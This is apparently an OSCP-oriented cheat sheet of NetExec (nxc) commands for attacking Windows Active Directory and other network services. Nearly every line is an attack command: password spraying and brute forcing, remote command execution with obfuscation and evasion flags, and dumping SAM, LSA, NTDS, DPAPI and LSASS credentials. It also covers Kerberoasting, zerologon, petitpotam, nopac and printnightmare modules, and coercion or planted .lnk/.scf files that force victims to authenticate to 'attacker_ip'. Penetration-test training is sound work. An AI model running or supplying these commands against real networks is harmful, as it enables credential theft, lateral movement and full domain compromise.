**Shared / General (use with any supported protocol like smb, ldap, winrm, mssql, etc.):**  
Basic scan / live hosts:  
nxc <protocol> 192.168.1.0/24

Auth check (valid creds):  
nxc <protocol> <target> -u user -p pass  
nxc <protocol> <target> -u user -H nthash  
nxc <protocol> <target> -u user -p pass -k (Kerberos)  
nxc <protocol> <target> -u user -p pass --local-auth

Password spraying (one password many users):  
nxc <protocol> <targets> -u users.txt -p 'Password123' --continue-on-success --no-bruteforce

Credential stuffing / brute (careful in OSCP):  
nxc <protocol> <target> -u users.txt -p passwords.txt --continue-on-success

Command execution (cmd):  
nxc <protocol> <target> -u user -p pass -x 'whoami /all'  
nxc <protocol> <target> -u user -p pass --exec-method wmiexec -x 'whoami' (methods: wmiexec, atexec, smbexec, mmcexec)

PowerShell execution:  
nxc <protocol> <target> -u user -p pass -X '$PSVersionTable' --obfs (obfuscate)

List modules for protocol:  
nxc <protocol> -L

Run module (with options/help):  
nxc <protocol> <target> -u user -p pass -M module_name -o OPTION=value  
nxc <protocol> -M module_name --options (show opts)

File transfer:  
nxc <protocol> <target> -u user -p pass --get-file 'remote\path' local.txt --share SHARE  
nxc <protocol> <target> -u user -p pass --put-file local.txt 'remote\path' --share SHARE

Custom port / evasion:  
nxc <protocol> <target> --port 445 -u user -p pass  
nxc <protocol> <target> -t 50 --jitter 1-3 --timeout 10

**SMB-specific (most common in OSCP for shares, signing, AD enum, relays, vulns):**  
Null/guest shares:  
nxc smb <target> -u '' -p '' --shares  
nxc smb <target> -u 'guest' -p '' --shares

Creds shares + access:  
nxc smb <target> -u user -p pass --shares

RID brute (no creds sometimes):  
nxc smb <target> --rid-brute (or with -u -p)

Domain enum (users/groups/computers/policy/sessions/loggedon):  
nxc smb <dc> -u user -p pass --users  
nxc smb <dc> -u user -p pass --groups  
nxc smb <dc> -u user -p pass --computers  
nxc smb <dc> -u user -p pass --pass-pol  
nxc smb <dc> -u user -p pass --sessions  
nxc smb <dc> -u user -p pass --loggedon-users  
nxc smb <dc> -u user -p pass --disks

Dumps:  
nxc smb <target> -u user -p pass --sam  
nxc smb <target> -u user -p pass --lsa  
nxc smb <target> -u user -p pass --ntds (drsuapi default)  
nxc smb <target> -u user -p pass --ntds vss  
nxc smb <target> -u user -p pass --dpapi

BloodHound collection:  
nxc smb <target> -u user -p pass --bloodhound -c all

Relay sig check + list:  
nxc smb 192.168.1.0/24 --gen-relay-list relay.txt

Vulns / coerce:  
nxc smb <target> -M zerologon  
nxc smb <target> -M petitpotam  
nxc smb <target> -M nopac  
nxc smb <target> -M printnightmare  
nxc smb <target> -M coerce_plus -o LISTENER=attacker_ip

Spider/download files:  
nxc smb <target> -u user -p pass -M spider_plus  
nxc smb <target> -u user -p pass -M spider_plus -o READ_ONLY=False DOWNLOAD_FLAG=True

LSASS dumps (modules):  
nxc smb <target> -u user -p pass -M lsassy  
nxc smb <target> -u user -p pass -M nanodump  
nxc smb <target> -u user -p pass -M procdump

Other modules:  
nxc smb <target> -u user -p pass -M enum_av (AV/EDR)  
nxc smb <target> -u user -p pass -M rdp -o ENABLE=true (enable RDP)  
nxc smb <target> -u user -p pass -M slinky -o SERVER=attacker_ip NAME=file.lnk (create symlink)  
nxc smb <target> -u user -p pass -M scuffy -o SERVER=attacker_ip NAME=file.scf  
nxc smb <target> -u user -p pass -M enum_dns (DNS via WMI)  
nxc smb <target> -u user -p pass -M get_netconnections (network conns)  
nxc smb <target> -u user -p pass -M backup_operator (NTDS dump via backup)  
nxc smb <target> -u user -p pass -M ntdsutil (NTDS via ntdsutil)

**LDAP-specific (great for AD enum, no-exec but rich info):**  
Basic enum (users/trusts/delegation):  
nxc ldap <dc> -u user -p pass --users  
nxc ldap <dc> -u user -p pass --trusted-for-delegation

Dumps / attacks:  
nxc ldap <dc> -u user -p pass --ntds  
nxc ldap <dc> -u user -p pass --asreproast hashes.asreproast  
nxc ldap <dc> -u user -p pass --kerberoasting hashes.kerb

BloodHound via LDAP:  
nxc ldap <dc> -u user -p pass --bloodhound -c all

Common modules:  
nxc ldap <dc> -u user -p pass -M shadow_credentials  
nxc ldap <dc> -u user -p pass -M laps -o computer=hostname  
nxc ldap <dc> -u user -p pass -M get-desc-users  
nxc ldap <dc> -u user -p pass -M groupmembership -o USER=username

**WinRM-specific (reliable shell / exec after foothold):**  
Dumps (if admin):  
nxc winrm <target> -u user -p pass --sam  
nxc winrm <target> -u user -p pass --lsa

**MSSQL-specific (DB enum + RCE via xp_cmdshell):**  
Enum / version:  
nxc mssql <target> -u user -p pass -q 'SELECT @@VERSION'

Enable & use xp_cmdshell:  
nxc mssql <target> -u user -p pass --enable-xp  
nxc mssql <target> -u user -p pass -X 'whoami'  (after enable)

Priv esc / link:  
nxc mssql <target> -u user -p pass -M mssql_priv -o ACTION=enum/escalate/link TARGET=other_sql

**Other protocols (less common in OSCP but appear):**  
RDP check / screenshot:  
nxc rdp <target> -u user -p pass  
nxc rdp <target> -u user -p pass --screenshot  
nxc rdp <target> --nla-screenshot (if NLA disabled)

SSH (Linux foothold):  
nxc ssh <target> -u user -p pass -x 'whoami'

FTP enum:  
nxc ftp <target> -u user -p pass

WMI exec / query:  
nxc wmi <target> -u user -p pass -x 'whoami'  
nxc wmi <target> -u user -p pass --wmi 'SELECT * FROM Win32_ComputerSystem'

VNC check:  
nxc vnc <target> -u user -p pass
